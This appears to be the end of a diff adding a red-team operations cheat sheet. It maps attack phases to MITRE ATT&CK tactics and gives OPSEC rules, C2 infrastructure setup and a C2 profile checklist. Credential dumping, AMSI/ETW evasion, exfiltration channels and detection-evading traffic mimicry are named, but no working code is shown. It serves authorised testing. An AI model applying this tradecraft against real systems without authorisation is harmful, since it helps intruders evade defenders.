+-----------------------------------------------------------------------------------
+Planning            Scope, ROE, deconfliction, legal auth          --
+Infrastructure      Domain aging, VPS, redirectors, TLS            TA0042
+Initial Access      Phishing, exploitation, physical               TA0001
+Execution           Loader -> minimal implant -> full C2           TA0002
+Persistence         Registry, scheduled tasks, DLL hijack          TA0003
+Priv Escalation     Token manipulation, UAC bypass, kerberoast     TA0004
+Defense Evasion     AMSI bypass, ETW patch, unhook, LOLBins        TA0005
+Credential Access   LSASS dump, kerberoast, DCSync                 TA0006
+Discovery           AD enumeration, network scanning               TA0007
+Lateral Movement    WinRM, SMB, DCOM, RDP hijack                   TA0008
+Collection          Stage sensitive data, encrypt                  TA0009
+Exfiltration        DNS tunnel, HTTPS chunked, cloud storage       TA0010
+C2                  Malleable profiles, sleep/jitter, fallbacks    TA0011
+Cleanup             Remove artifacts, verify, document             --
+Reporting           Narrative, findings, ATT&CK map, debrief       --
+```
+
+```text
+OPSEC RULES (NON-NEGOTIABLE)
+  - Team server binds to 127.0.0.1 only; all external access via redirector/tunnel
+  - Kill dates on every beacon; no exceptions
+  - Zero-sleep only during active hands-on-keyboard; 60s+ otherwise
+  - Encrypt all collected data immediately; never store plaintext credentials
+  - Separate infrastructure per tier; burning T1 must not expose T3
+  - Strip metadata from all delivered files
+  - Log every action with timestamp, target, technique, and deconfliction code
+  - Never reuse infrastructure, domains, or tooling across engagements
+
+INFRASTRUCTURE QUICK REFERENCE
+  Redirector:   nginx/apache with URI + User-Agent filtering
+  Tunnel:       cloudflared, SSH, or WireGuard to team server localhost
+  Domain age:   minimum 14 days; 30 preferred; categorize within first week
+  TLS:          Let's Encrypt or commercial CA; never self-signed
+  DNS:          separate registrar from hosting; enable WHOIS privacy
+
+C2 PROFILE CHECKLIST
+  [ ] host_stage = false (disable staging)
+  [ ] sleep/jitter configured per beacon tier
+  [ ] User-Agent matches target's legitimate traffic
+  [ ] URIs mimic real application endpoints
+  [ ] Memory obfuscation enabled (sleep_mask, obfuscate)
+  [ ] Valid TLS certificate in keystore
+  [ ] Spawn-to process set to legitimate binary (not rundll32)
+  [ ] Named pipes randomized (not default CS pattern)
+```
+
+---
+
+## Key References
+
+- MITRE ATT&CK Enterprise Matrix: https://attack.mitre.org/matrices/enterprise/
+- MITRE ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
+- Red Team Operations with Cobalt Strike (Raphael Mudge): https://www.cobaltstrike.com/training
+- SpecterOps Red Team Operations courses: https://specterops.io/training
+- CISA Red Team Sharing Guide: https://www.cisa.gov/resources-tools/resources/cisa-red-team-sharing-guide
+- TIBER-EU Framework (threat-intelligence-based ethical red teaming): https://www.ecb.europa.eu/paym/cyber-resilience/tiber-eu/html/index.en.html
+- PTES (Penetration Testing Execution Standard): http://www.pentest-standard.org/
+- LOLBAS Project (Living Off The Land Binaries): https://lolbas-project.github.io/
+- SysWhispers3: https://github.com/klezVirus/SysWhispers3
+- HellsGate / HalosGate: https://github.com/am0nsec/HellsGate
